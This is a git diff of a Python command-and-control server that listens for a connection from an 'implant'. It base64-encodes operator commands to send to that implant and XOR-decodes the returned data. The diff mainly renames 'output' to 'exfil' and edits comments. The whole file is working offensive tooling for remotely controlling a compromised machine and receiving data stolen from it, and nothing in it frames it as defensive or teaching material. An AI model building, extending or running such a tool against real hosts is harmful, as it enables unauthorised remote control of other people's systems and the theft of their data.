@@ -3,7 +3,7 @@ import base64
 
 def connect_to_implant( server_socket , port ):
     '''
-    Accept connection from implant and connect
+    Setup port for listening , accepting and connecting with implant
     '''
     server_socket.setsockopt( socket.SOL_SOCKET , socket.SO_REUSEADDR, 1 )
     server_socket.bind( ( '0.0.0.0' , port ) )
@@ -20,14 +20,14 @@ def encode_command( cmd ):
     b64_encoded_cmd = b64_encoded_cmd.encode() + b'\n'
     return b64_encoded_cmd
 
-def decode_output( conn , data_length ):
+def decode_exfil( conn , data_length ):
     '''
-    Decode output returned by implant
+    Decode exfil returned by implant
     '''
-    xor_encoded_output = conn.recv( int( data_length ) ).decode()
-    # Decode the output using XOR
-    output = ''.join( chr( ord( c ) ^ 0x20 ) for c in xor_encoded_output )  # Same key as the client
-    return output
+    xor_encoded_exfil = conn.recv( int( data_length ) ).decode()
+    # Decode the exfil using XOR
+    exfil = ''.join( chr( ord( c ) ^ 0x20 ) for c in xor_encoded_exfil )  # Same key as the client
+    return exfil
 
 
 def main():
@@ -38,26 +38,24 @@ def main():
 
     with socket.socket() as server_socket:
         conn, addr = connect_to_implant( server_socket , port )
+        # Start communicating with implant once connection is setup
         with conn:
             print( "Connected by", addr )
             while True:
-                #Get command to send to implant
+                # Get command to send to implant
                 cmd = input( "Enter command: " )
                 if not cmd:
                     break
-                
                 # Encode command
                 encoded_cmd = encode_command( cmd )
                 conn.send( encoded_cmd )
-
-                # Receive output from the implant
+                # Receive exfil from the implant
                 data_length = conn.recv( 10 ).decode()
                 if not data_length:
                     print( "Connection ended by the client." )
                     break
-
-                output = decode_output( conn , data_length )
-                print( "Output from implant:", output )
+                exfil = decode_exfil( conn , data_length )
+                print( "Exfil from implant:", exfil )
 
 if __name__ == '__main__':
     main()
